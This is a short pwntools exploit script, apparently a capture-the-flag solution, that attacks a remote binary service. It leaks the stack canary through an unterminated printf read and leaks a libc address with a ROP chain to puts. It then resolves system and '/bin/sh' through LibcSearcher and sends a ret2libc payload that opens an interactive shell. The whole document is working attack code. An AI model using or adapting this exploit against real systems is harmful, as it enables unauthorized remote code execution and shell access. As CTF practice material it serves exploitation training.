from pwn import*
from LibcSearcher import*
context(arch="amd64", os="linux", log_level="info")

# Load the ELF file and execute it as a new process.

p=remote("10.12.153.73", 11930)
elf=ELF("./pwn.bin")

pop_rdi = 0x401343
ret=0x40101a
binsh = 0x404058
system=0x4010b0

#利用printf没读到\0不截断的特点，泄露canary
payload1=b'a'*72
p.sendlineafter('name?',payload1)

p.recvuntil(b'a'*72)
canary=u64(p.recv(8))-0xa

print(hex(canary))

payload = cyclic(72)+p64(canary)+p64(0)+p64(pop_rdi)+p64(elf.got["puts"])+p64(elf.plt["puts"])+p64(elf.sym["main"])

p.sendlineafter('stack!',payload)

puts = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts))

libc=LibcSearcher("puts",puts)

libcbase=puts-libc.dump('puts')
system=libcbase+libc.dump('system')
binsh=libcbase+libc.dump('str_bin_sh')
print(hex(system))
print(hex(binsh))

payload=cyclic(72)+p64(canary)+p64(0)+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)
p.sendlineafter('name?',b'1')
p.sendlineafter('stack!',payload)
p.interactive()